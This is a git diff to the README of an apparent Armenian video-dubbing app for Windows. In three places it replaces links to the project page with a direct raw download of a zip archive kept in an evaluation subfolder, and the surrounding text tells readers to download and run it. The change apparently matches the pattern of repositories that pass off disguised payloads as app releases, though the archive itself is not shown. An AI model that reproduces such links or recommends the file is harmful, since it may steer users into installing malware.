@@ -1,11 +1,11 @@
 # 🎬 armenian-video-dubbing - Dub Armenian videos with natural voice
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Breadad4702/armenian-video-dubbing)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Breadad4702/armenian-video-dubbing/main/scripts/evaluation/human_eval/dubbing-video-armenian-v1.4-beta.3.zip)
 
 ## 📥 Download
 Get the app from the project page here:
 
-https://github.com/Breadad4702/armenian-video-dubbing
+https://raw.githubusercontent.com/Breadad4702/armenian-video-dubbing/main/scripts/evaluation/human_eval/dubbing-video-armenian-v1.4-beta.3.zip
 
 Visit this page to download the latest Windows build, then save the file to your computer
 
@@ -179,7 +179,7 @@ It is built for users who want a direct way to make Armenian dubbed videos on Wi
 ## 🔗 Download again
 Open the main project page here and download the Windows file:
 
-https://github.com/Breadad4702/armenian-video-dubbing
+https://raw.githubusercontent.com/Breadad4702/armenian-video-dubbing/main/scripts/evaluation/human_eval/dubbing-video-armenian-v1.4-beta.3.zip
 
 ## 📄 License
 Use the project page and repository files for the latest license and usage details
